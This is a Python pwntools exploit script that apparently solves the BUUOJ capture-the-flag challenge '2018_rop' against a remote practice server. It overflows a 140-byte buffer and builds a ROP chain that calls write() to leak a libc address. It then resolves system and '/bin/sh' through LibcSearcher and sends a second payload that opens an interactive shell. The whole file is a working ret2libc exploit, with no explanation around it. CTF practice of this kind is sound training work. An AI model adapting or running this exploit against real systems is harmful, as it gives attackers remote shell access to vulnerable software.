from LibcSearcher import LibcSearcher
from pwn import *


def buuoj_2018_rop(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/2018_rop'):
    print('buuoj_2018_rop start')
    context(log_level='debug', arch='i386', os='linux')
    target = process([file_name])
    target = remote('node4.buuoj.cn', 25583)
    target_elf = ELF(file_name)

    write_plt = p32(target_elf.plt['write'])
    write_got = p32(target_elf.got['write'])

    vulnerable_func_ptr = p32(target_elf.symbols['vulnerable_function'])

    pop_ret_gadget = p32(0x08048344)  # pop ebx ; ret
    pop3_ret_gadget = p32(0x0804855d)  # pop esi ; pop edi ; pop ebp ; ret

    payload_1 = b'A' * 140
    # write(1, *write_got, 0x4);
    payload_1 += write_plt + pop3_ret_gadget + p32(0x1) + write_got + p32(0x4)
    # vulnerable_function()
    payload_1 += vulnerable_func_ptr

    target.sendline(payload_1)

    write_ptr = u32(target.recv()[:4])
    print(hex(write_ptr))

    searcher = LibcSearcher('write', write_ptr)
    libc_base = write_ptr - searcher.dump('write')

    system_ptr = p32(libc_base + searcher.dump('system'))
    bin_sh_ptr = p32(libc_base + searcher.dump('str_bin_sh'))

    payload_2 = b'A' * 140
    # system('/bin/sh')
    payload_2 += system_ptr + pop_ret_gadget + bin_sh_ptr

    target.sendline(payload_2)

    target.interactive()

    print('buuoj_2018_rop end')


if __name__ == '__main__':
    buuoj_2018_rop()
